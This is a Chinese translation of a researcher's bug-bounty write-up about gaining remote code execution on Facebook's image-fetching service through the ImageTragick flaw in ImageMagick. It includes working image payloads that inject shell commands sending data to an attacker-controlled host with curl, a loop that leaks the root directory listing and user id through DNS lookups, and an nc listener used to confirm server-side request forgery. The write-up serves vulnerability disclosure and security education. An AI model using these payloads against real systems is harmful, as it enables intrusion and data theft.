### 优化后的文本

本文档是翻译稿，原文见：[https://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html](https://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html)

#### 背景
许多人都熟悉 [ImageMagick](https://www.imagemagick.org/) 及其安全漏洞 [ImageTragick](https://imagetragick.com/)。由于众多应用程序依赖于 ImageMagick 库，这一漏洞的曝光引起了广泛关注。不仅漏洞发现者和研究人员可以利用该漏洞，其他攻击者也可以进行相应的攻击。尽管在 2016 年已经发现了这一漏洞的具体细节（但没有公开 POC），许多研究者在漏洞未被修复时就已发现其易于利用。然而，由于某些未知原因，我未能成为其中之一。

#### 测试过程
我在十月份的一个周六对一个大型服务进行了测试（不是 Facebook），但一些重定向指向了 Facebook。以下是“分享到 Facebook”的页面 URL：
```
https://www.facebook.com/dialog/feed?app_id=APP_ID&link=link.example.tld&picture=http%3A%2F%2Fattacker.tld%2Fexploit.png&name=news_name&caption=news_caption&description=news_description&redirect_uri=http%3A%2F%2Fwww.facebook.com&ext=1476569763&hash=Aebid3vZFdh4UF1H
```

仔细观察 `picture` 参数的 URL，可以看到它并没有直接包含图片的 URL。实际的请求如下：
```
https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&w=158&h=158&url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&cfs=1&upscale=1&_nc_hash=AQD2uvqIgAdXgWyb
```

我认为这里可能存在 SSRF 问题。通过以下测试，我发现该请求来自 `31.13.97.*` 网络，并使用了 `facebookexternalhit/1.1.` 用户代理：
```
nc -lvvv 8088
Connection from 31.13.97.* port 8088 [tcp/radan-http] accepted
GET /exploit.png?ddfadsvdbv HTTP/1.1
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: */*
Accept-Encoding: deflate, gzip
Host: attacker.tld
Connection: keep-alive
```

虽然这看起来像是一个合理的请求，但在某些情况下，应用程序可能使用转换器来处理图片。因此，我开始进一步探索。经过一系列参数测试（例如，使用 SVG 进行 XML 解析），我发现了 SSRF 问题，但并未发现 XXE 问题。最终，我决定尝试利用 ImageTragick 漏洞。

#### ImageTragick 漏洞利用
我构造了一个简单的 payload：
```svg
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60curl "http://attacker.tld/" -d @- > /dev/null`'
pop graphic-context
```

但是，没有任何响应。于是我想到了防火墙限制的可能性。为了绕过防火墙，我尝试了以下代码：
```svg
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60curl "http://record_under_attacker_controled_ns_server.attacker.tld/" -d @- > /dev/null`'
pop graphic-context
```

结果如下：
```
IP: 31.13.*.*; NetName: LLA1-11
NAME: record_under_attacker_controled_ns_server.attacker.tld, Type: A
```

通过 whois 查询，确认该 IP 属于 Facebook。

#### 利用流程
应用的工作流程如下：
1. 获取图片参数并请求图片 —— 此请求是正常且无威胁的。
2. 接收到的图片被传递给使用易受攻击的 ImageMagick 库的转换器实例。

我尝试找到通用的方法来探测 HTTP 请求，但简短的测试显示所有无关端口均关闭。随后，我使用更高效的方法找到了 PoC。

最终的 payload 如下：
```svg
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60for i in $(ls /) ; do curl "http://$i.attacker.tld/" -d @- > /dev/null; done`'
pop graphic-context
```

结果如下：
```
NAME: home.attacker.tld, Type: A
NAME: boot.attacker.tld, Type: 28
NAME: dev.attacker.tld, Type: 28
NAME: bin.attacker.tld, Type: A
...
```

用户 ID 的 shell 命令返回：
```
NAME: uid=99(nobody).attacker.tld., Type: 28
NAME: groups=99(nobody).attacker.tld., Type: A
NAME: gid=99(nobody).attacker.tld., Type: A
```

为了充分证明漏洞的可利用性，我向 Facebook 安全团队提供了 `cat /proc/version` 的输出结果，但未在此公布。

根据 Facebook 的“责任披露政策”，我没有采取进一步的攻击行动。在初步报告完成后，我与 Facebook 安全团队的 Neal 讨论了 `cat /proc/version | base64` 的深层利用方法。进一步的研究表明，`base32` 在包括 DNS 在内的多种技术中更为常用。

我很高兴上述攻击对 Facebook 成功奏效。